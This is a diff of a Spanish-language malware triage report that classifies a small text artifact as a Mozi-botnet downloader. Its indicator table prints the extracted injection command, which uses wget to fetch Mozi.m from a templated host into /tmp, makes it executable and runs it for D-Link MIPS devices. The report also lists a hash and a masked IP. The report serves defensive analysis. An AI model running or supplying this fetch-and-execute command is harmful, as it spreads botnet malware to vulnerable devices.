@@ -4,7 +4,8 @@
 
 ## 📌 Resumen
 
-Artefacto clasificado como **Downloader / Dropper** a partir de la evidencia disponible en Oráculo SOC. Comportamientos destacados: Descarga remota, Cambio de permisos. Se asoció 1 comando observado o extraído.
+Artefacto identificado como ASCII text, with CRLF line terminators de 121 B. La evidencia estática disponible identifica capacidad de descarga remota. La referencia remota apunta al recurso `Mozi.m` en `hxxp://%s:%d/Mozi.m`. Se observaron o extrajeron 1 comandos relacionados con el artefacto.
+
 
 ## 🏷️ Clasificación
 
@@ -14,7 +15,7 @@ Artefacto clasificado como **Downloader / Dropper** a partir de la evidencia dis
 
 ## 🗓️ Registro
 
-- **Registrado:** `2026-08-09T20:45:19+00:00`
+- **Registrado:** `2026-08-09T20:45:19.000000Z`
 - **Tipo de registro:** `snapshot inmutable`
 
 ## 🔐 Identidad
@@ -54,8 +55,8 @@ Artefacto clasificado como **Downloader / Dropper** a partir de la evidencia dis
 | Tipo | Valor | Contexto |
 | --- | --- | --- |
 | url | hxxp://%s:%d/Mozi.m%20-O%20- | strings |
-| hash | 4094d7ce7869e0147731aa495779b115a4536772ccae4445d78994b6147968fb | static_analysis |
 | command | 27;wget%20http://%s:%d/Mozi.m%20-O%20->%20/tmp/Mozi.m;chmod%20777%20/tmp/Mozi.m;/tmp/Mozi.m%20dlink.mips%27$ HTTP/1.0 | strings |
+| hash | 4094d7ce7869e0147731aa495779b115a4536772ccae4445d78994b6147968fb | static_analysis |
 | ip | 160.30.142.XXX | artifact_source |
 
 ## 🔎 Triage
